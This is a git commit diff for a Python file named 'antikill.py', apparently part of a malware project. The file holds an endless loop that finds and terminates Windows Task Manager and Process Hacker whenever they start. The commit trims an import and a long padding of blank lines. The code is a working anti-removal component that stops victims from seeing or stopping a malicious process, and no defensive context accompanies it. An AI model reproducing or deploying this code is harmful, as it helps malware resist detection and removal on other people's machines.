7236830c398fb2b0b8952ef44bd881d33e1aaa78
overdrive456 <99812826+overdrive456@users.noreply.github.com>
2022-05-23 21:46:48 +0300

    Update antikill.py

--- antikill.py
+++ antikill.py
@@ -1,47 +1,7 @@
 import psutil
-import subprocess
 def kill_task():
     while True:
         for proc in psutil.process_iter():
             if proc.name().lower() == 'taskmgr.exe' or proc.name() == "ProcessHacker.exe":
                 proc.terminate()
-
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-# I walk around forever in a depressed state, as if the eternal spleen has descended on me
+              # I walk around forever in a depressed state, as if the eternal spleen has descended on me
